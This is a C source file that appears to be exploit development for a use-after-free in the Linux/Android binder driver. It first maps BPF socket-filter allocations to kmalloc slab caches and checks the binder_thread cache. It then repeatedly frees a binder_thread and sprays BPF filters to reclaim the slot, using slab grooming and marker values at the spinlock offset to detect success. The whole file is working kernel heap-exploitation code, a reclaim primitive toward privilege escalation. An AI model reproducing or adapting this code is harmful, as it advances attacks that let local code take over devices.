/*
 * bpf_slab_probe.c — Definitively measure which slab cache BPF filters go to
 * for different instruction counts. Also verify binder_thread slab.
 * Then test reclaim with correct matching.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT  0x40046208
#define BINDER_SET_MAX_THREADS 0x40046205

struct slab_info {
    long k64, k128, k192, k256, k512;
};

static void read_slabs(struct slab_info *s) {
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];
    s->k64 = s->k128 = s->k192 = s->k256 = s->k512 = 0;
    while (fgets(line, sizeof(line), f)) {
        long active;
        char name[64];
        if (sscanf(line, "%63s %ld", name, &active) == 2) {
            if (!strcmp(name, "kmalloc-64"))  s->k64  = active;
            if (!strcmp(name, "kmalloc-128")) s->k128 = active;
            if (!strcmp(name, "kmalloc-192")) s->k192 = active;
            if (!strcmp(name, "kmalloc-256")) s->k256 = active;
            if (!strcmp(name, "kmalloc-512")) s->k512 = active;
        }
    }
    fclose(f);
}

/* Create N BPF sockets with given instruction count */
static int bpf_spray(int *fds, int count, int num_insns) {
    struct sock_filter *insns = calloc(num_insns, sizeof(struct sock_filter));
    for (int j = 0; j < num_insns - 1; j++) {
        insns[j].code = 0x00; /* BPF_LD|BPF_IMM */
        insns[j].k = 0;
    }
    insns[num_insns - 1].code = 0x06; /* BPF_RET|BPF_K */
    insns[num_insns - 1].k = 0xFFFF;
    
    struct sock_fprog prog = { .len = num_insns, .filter = insns };
    int created = 0;
    for (int i = 0; i < count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] < 0) break;
        if (setsockopt(fds[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0) {
            close(fds[i]);
            fds[i] = -1;
            break;
        }
        created++;
    }
    free(insns);
    return created;
}

int main() {
    /* Pin to CPU 0 */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    printf("=== BPF Slab Probe ===\n\n");

    /* TEST 1: Which slab does BPF go to for various insn counts? */
    printf("--- TEST 1: BPF slab mapping for various instruction counts ---\n");
    printf("  Header + N*8 = total. kmalloc bucket:\n");
    int test_counts[] = {14, 16, 18, 20, 21, 22, 24, 26};
    for (int t = 0; t < 8; t++) {
        int n = test_counts[t];
        int fds[100];
        struct slab_info before, after;
        
        read_slabs(&before);
        int made = bpf_spray(fds, 100, n);
        read_slabs(&after);
        
        printf("  %2d insns (%3d+header): k128=%+ld k192=%+ld k256=%+ld k512=%+ld (made=%d)\n",
               n, n * 8,
               after.k128 - before.k128,
               after.k192 - before.k192,
               after.k256 - before.k256,
               after.k512 - before.k512,
               made);
        
        for (int i = 0; i < made; i++) close(fds[i]);
        usleep(10000); /* let frees settle */
    }

    /* TEST 2: Verify binder_thread slab (via epoll_ctl, no BC_ENTER_LOOPER) */
    printf("\n--- TEST 2: binder_thread slab verification ---\n");
    {
        int bfds[50], epfds[50];
        struct slab_info before, after;
        
        read_slabs(&before);
        for (int i = 0; i < 50; i++) {
            bfds[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
            uint32_t mx = 0;
            ioctl(bfds[i], BINDER_SET_MAX_THREADS, &mx);
            epfds[i] = epoll_create1(O_CLOEXEC);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfds[i], EPOLL_CTL_ADD, bfds[i], &ev);
        }
        read_slabs(&after);
        printf("  50 binder_threads: k128=%+ld k192=%+ld k256=%+ld k512=%+ld\n",
               after.k128 - before.k128,
               after.k192 - before.k192,
               after.k256 - before.k256,
               after.k512 - before.k512);
        
        for (int i = 0; i < 50; i++) {
            close(epfds[i]);
            close(bfds[i]);
        }
        usleep(10000);
    }

    /* TEST 3: Direct reclaim test — free binder_thread, alloc BPF, check for hang */
    printf("\n--- TEST 3: Reclaim test (free binder_thread → BPF alloc) ---\n");
    printf("  If BPF reclaims: close(epfd) hangs on spinlock (killed by alarm)\n");
    printf("  If no reclaim: close(epfd) completes safely\n\n");
    
    int hangs = 0, completions = 0;
    for (int attempt = 0; attempt < 50; attempt++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(2);
            
            cpu_set_t cs;
            CPU_ZERO(&cs);
            CPU_SET(0, &cs);
            sched_setaffinity(0, sizeof(cs), &cs);
            
            /* Open binder + epoll */
            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            uint32_t mx = 0;
            ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
            
            int epfd = epoll_create1(O_CLOEXEC);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
            
            /* Free binder_thread */
            int thr = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &thr);
            
            /* IMMEDIATELY allocate BPF in kmalloc-192 (20 insns) */
            struct sock_filter insns[20];
            for (int j = 0; j < 19; j++) {
                insns[j].code = 0x00;
                insns[j].jt = 0; insns[j].jf = 0;
                insns[j].k = 0xDEAD0000 + j;
            }
            insns[19].code = 0x06;
            insns[19].k = 0xFFFF;
            
            /* Critical: put recognizable non-zero at offset 44 (insns[3]) */
            insns[3].code = 0x15; /* BPF_JMP|BPF_JEQ|BPF_K */
            insns[3].jt = 0x0F;
            insns[3].jf = 0xAB;
            insns[3].k = 0xBAADF00D;
            
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            struct sock_fprog prog = { .len = 20, .filter = insns };
            setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
            
            /* THIS IS THE UAF: close(epfd) walks wait queue on freed memory.
             * If BPF reclaimed the slot, spin_lock at offset 44 sees non-zero
             * (BPF_S_JMP_JEQ_K internal code) → hangs → alarm kills us. */
            close(epfd);
            
            /* If we get here, BPF did NOT reclaim (spinlock was 0 = old data) */
            close(sock);
            close(bfd);
            _exit(0);
        }
        
        int status;
        waitpid(pid, &status, 0);
        
        if (WIFSIGNALED(status) && WTERMSIG(status) == 14) {
            hangs++;
            printf("  [%d] HANG (SIGALRM) → BPF RECLAIMED!\n", attempt);
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            completions++;
        } else {
            printf("  [%d] signal=%d exit=%d\n", attempt,
                   WIFSIGNALED(status) ? WTERMSIG(status) : -1,
                   WIFEXITED(status) ? WEXITSTATUS(status) : -1);
        }
    }
    printf("  Result: %d hangs, %d completions out of 50\n", hangs, completions);
    
    if (hangs == 0) {
        /* TEST 4: Try with slab grooming — fill+drain technique */
        printf("\n--- TEST 4: Groomed reclaim (fill slab + create hole) ---\n");
        hangs = 0; completions = 0;
        
        for (int attempt = 0; attempt < 50; attempt++) {
            pid_t pid = fork();
            if (pid == 0) {
                alarm(3);
                
                cpu_set_t cs;
                CPU_ZERO(&cs);
                CPU_SET(0, &cs);
                sched_setaffinity(0, sizeof(cs), &cs);
                
                /* Phase 1: Fill k192 slab with BPF (make current page full) */
                int fill_fds[200];
                struct sock_filter fill_insns[20];
                for (int j = 0; j < 19; j++) {
                    fill_insns[j].code = 0x00;
                    fill_insns[j].k = 0;
                }
                fill_insns[19].code = 0x06;
                fill_insns[19].k = 0xFFFF;
                struct sock_fprog fill_prog = { .len = 20, .filter = fill_insns };
                
                for (int i = 0; i < 200; i++) {
                    fill_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
                    setsockopt(fill_fds[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              &fill_prog, sizeof(fill_prog));
                }
                
                /* Phase 2: Free some to create holes LIFO → last freed = first reclaimed */
                for (int i = 195; i >= 190; i--) {
                    close(fill_fds[i]);
                    fill_fds[i] = -1;
                }
                
                /* Phase 3: Create binder_thread (fills a hole) */
                int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
                uint32_t mx = 0;
                ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
                int epfd = epoll_create1(O_CLOEXEC);
                struct epoll_event ev = { .events = EPOLLIN };
                epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
                
                /* Phase 4: Free binder_thread → back to per-CPU freelist */
                int thr = 0;
                ioctl(bfd, BINDER_THREAD_EXIT, &thr);
                
                /* Phase 5: BPF reclaim with recognizable data at spinlock offset */
                struct sock_filter det_insns[20];
                memset(det_insns, 0, sizeof(det_insns));
                det_insns[3].code = 0x15;
                det_insns[3].jt = 0xFF;
                det_insns[3].jf = 0xFF;
                det_insns[3].k = 0xBAADF00D;
                det_insns[19].code = 0x06;
                det_insns[19].k = 0xFFFF;
                
                int det_sock = socket(AF_INET, SOCK_DGRAM, 0);
                struct sock_fprog det_prog = { .len = 20, .filter = det_insns };
                setsockopt(det_sock, SOL_SOCKET, SO_ATTACH_FILTER,
                          &det_prog, sizeof(det_prog));
                
                /* Phase 6: UAF trigger */
                close(epfd);
                
                close(det_sock);
                for (int i = 0; i < 200; i++)
                    if (fill_fds[i] >= 0) close(fill_fds[i]);
                close(bfd);
                _exit(0);
            }
            
            int status;
            waitpid(pid, &status, 0);
            
            if (WIFSIGNALED(status) && WTERMSIG(status) == 14) {
                hangs++;
                printf("  [%d] HANG → BPF RECLAIMED!\n", attempt);
            } else if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                completions++;
            } else {
                printf("  [%d] signal=%d exit=%d\n", attempt,
                       WIFSIGNALED(status) ? WTERMSIG(status) : -1,
                       WIFEXITED(status) ? WEXITSTATUS(status) : -1);
            }
        }
        printf("  Result: %d hangs, %d completions out of 50\n", hangs, completions);
    }

    printf("\n=== Done ===\n");
    return 0;
}
